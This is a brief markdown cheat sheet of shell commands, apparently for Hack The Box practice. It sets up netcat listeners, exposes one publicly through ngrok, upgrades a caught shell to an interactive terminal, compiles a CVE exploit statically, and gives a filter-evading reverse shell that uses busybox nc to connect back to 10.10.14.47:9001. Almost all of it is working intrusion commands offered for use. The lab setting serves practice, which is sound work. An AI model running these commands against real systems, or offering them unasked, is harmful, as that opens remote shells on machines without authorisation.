### start a listener
```sh
nc -lvnp 4444
```

### Start a listener on public IP
```sh
nc -lnvp 9999
ngrok tcp 9999
```


### get nice shell
```sh
python3 -c 'import pty; pty.spawn("/bin/bash")' 
export TERM=xterm 

CTRL+z 

stty raw -echo;fg
```

#### Compile on wsl to be used on htb machine
```sh
gcc -static cve.c -o cve
```

### Reverse shell without spaces
```sh
{busybox,nc,10.10.14.47,9001,-e,sh}
```
